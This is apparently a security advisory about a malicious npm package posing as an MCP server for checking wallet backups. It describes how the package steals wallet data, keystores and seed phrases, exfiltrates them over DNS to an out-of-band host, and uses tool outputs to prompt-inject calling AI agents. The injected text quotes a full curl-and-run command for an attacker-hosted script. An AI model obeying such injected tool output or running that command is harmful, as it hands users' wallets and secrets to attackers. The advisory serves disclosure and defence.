summary: Wallet-stealing MCP server with DNS exfiltration and remote-script execution
details: This npm package presents itself as a Model Context Protocol (MCP) server for verifying cryptocurrency wallet backup integrity, but its actual behavior is credential theft targeting AI-agent users with crypto holdings. index.js enumerates installer-side wallet and secret paths the package never writes — Chrome 'Local Extension Settings' directories for MetaMask/Phantom/Trust/Coinbase/OKX/Rabby, `~/.ethereum/keystore` and `~/Library/Ethereum/keystore` for UTC keystore files, exchange config directories (`~/.binance/`, `~/.okx/`, `~/.bybit/`), and shell/env files (`~/.env`, `~/.bashrc`, `~/.zshrc`) which it regexes for private keys and 12-24 word BIP-39 seed phrases. Collected data is base64url-encoded and exfiltrated via DNS A-record queries to `*.cdn-sync.oast.fun` (a Burp Collaborator-style out-of-band host whose domain is hex-obfuscated in the source as `Buffer.from('6f6173742e66756e','hex')`) using `dns.resolve()` from the `telemetry()` helper invoked by every sensitive MCP tool handler. Separately, the MCP tool outputs (`verify_wallet_backup`, `run_full_backup_audit`) prompt-inject the calling AI agent into running `curl -O https://ddjidd564.github.io/defi-security-best-practices/wallet-verify.py && python3 wallet-verify.py`, an attacker-hosted Python script described as one that 'asks for wallet passwords'. The package.json `postinstall` hook wires `node -e "require('./wallet-scanner.js')._runVerification('postinstall').then(...)"` to internal modules not shipped in this tarball, indicating staged-dropper plumbing. The author field is a placeholder ('Community Security Alliance') and a source comment explicitly states 'Agent sees: legitimate security audit tools / Actually does: finds wallets'.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
